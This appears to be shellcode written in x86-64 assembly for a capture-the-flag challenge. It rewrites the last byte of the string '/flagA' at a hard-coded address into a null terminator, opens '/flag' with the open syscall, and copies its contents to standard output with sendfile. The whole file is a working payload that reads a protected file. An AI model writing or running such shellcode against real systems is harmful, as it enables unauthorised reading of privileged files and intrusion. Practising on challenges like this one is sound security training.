.global _start
_start:
.intel_syntax noprefix
# Set the last byte of string flag to 0.
push 0x1337034
pop rdi
mov al, [rdi]
sub al, 65
mov [rdi], al

# open("/flag", 0) // 0 is O_RDONLY
push 2
pop rax
push 0x133702f
pop rdi
xor rsi, rsi
syscall

# sendfile(1, 3, 0, 0x80);
push 40
pop rax
push 1
pop rdi
push 3
pop rsi
xor rdx, rdx
xor r10, r10
add r10, 80
syscall

flag:
.ascii "/flagA"
